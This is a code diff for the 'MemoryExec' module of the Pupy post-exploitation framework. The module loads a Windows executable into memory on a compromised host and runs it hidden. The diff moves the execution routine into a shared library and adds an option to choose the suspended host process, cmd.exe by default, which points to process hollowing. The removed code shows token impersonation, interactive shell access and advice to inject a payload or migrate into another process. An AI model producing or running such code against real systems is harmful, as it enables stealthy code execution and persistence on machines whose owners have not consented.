@@ -18,6 +18,7 @@ from pupylib.PupyCompleter import *
 from pupylib.utils.pe import get_pe_arch
 from pupylib.PupyErrors import PupyModuleError
 from pupylib.utils.rpyc_utils import redirected_stdio
+from modules.lib.windows.memory_exec import exec_pe
 import time
 
 __class_name__="MemoryExec"
@@ -39,9 +40,10 @@ class MemoryExec(PupyModule):
 		self.arg_parser.add_argument('--fork', action='store_true', help='fork and do not wait for the child program. stdout will not be retrieved')
 		self.arg_parser.add_argument('-i', '--interactive', action='store_true', help='interact with the process stdin.')
 		self.arg_parser.add_argument('-m', '--impersonate', action='store_true', help='use the current impersonated token (to use with impersonate module)')
+		self.arg_parser.add_argument('-s', '--suspended-process', default="cmd.exe", help='change the suspended process to spawn (default: cmd.exe)')
 		self.arg_parser.add_argument('--timeout', metavar='<timeout>', type=float, help='kill the program after <timeout> seconds if it didn\'t exit on its own')
 		self.arg_parser.add_argument('path', help='path to the exe', completer=path_completer)
-		self.arg_parser.add_argument('args', help='optional arguments to pass to the exe')
+		self.arg_parser.add_argument('args', nargs=argparse.REMAINDER, help='optional arguments to pass to the exe')
 
 	def interrupt(self):
 		self.info("interrupting remote process, please wait ...")
@@ -51,52 +53,7 @@ class MemoryExec(PupyModule):
 			self.log(res)
 
 
-	def exec_pe(self, path, prog_args, interactive=False, fork=False, timeout=None, use_impersonation=False):
-		pe_arch=get_pe_arch(path)
-		proc_arch=self.client.desc["proc_arch"]
-		if pe_arch!=proc_arch:
-			self.error("%s is a %s PE and your pupy payload is a %s process. Please inject a %s PE or migrate into a %s process first"%(path, pe_arch, proc_arch, proc_arch, pe_arch))
-			return
-		wait=True
-		redirect_stdio=True
-		if fork:
-			wait=False
-			redirect_stdio=False
-		raw_pe=b""
-		with open(path,'rb') as f:
-			raw_pe=f.read()
-		self.client.load_package("pupymemexec")
-		self.client.load_package("pupwinutils.memexec")
-
-		res=""
-		dupHandle=None
-		if use_impersonation:
-			dupHandle=self.client.impersonated_dupHandle
-			if dupHandle is None:
-				self.error("No token has been impersonated on this session. use impersonate module first")
-				return
-		self.mp=self.client.conn.modules['pupwinutils.memexec'].MemoryPE(raw_pe, args=prog_args, hidden=True, redirect_stdio=redirect_stdio, dupHandle=dupHandle)
-		with redirected_stdio(self.client.conn):
-			self.mp.run()
-		if not fork:
-			if interactive:
-				try:
-					with redirected_stdio(self.client.conn):
-						self.mp.get_shell()
-				finally:
-					self.mp.close()
-			else:
-				starttime=time.time()
-				while True:
-					if self.mp.wait(1):
-						break
-					if timeout:
-						if time.time()-starttime>timeout:
-							break
-				self.mp.close()
-				res=self.mp.get_stdout()
-				self.log(res)
 				
 	def run(self, args):
-		self.exec_pe(args.path, args.args, interactive=args.interactive, fork=args.fork, timeout=args.timeout, use_impersonation=args.impersonate)
+		exec_pe(self, args.args, path=args.path, interactive=args.interactive, fork=args.fork, timeout=args.timeout, use_impersonation=args.impersonate, suspended_process=args.suspended_process)
 
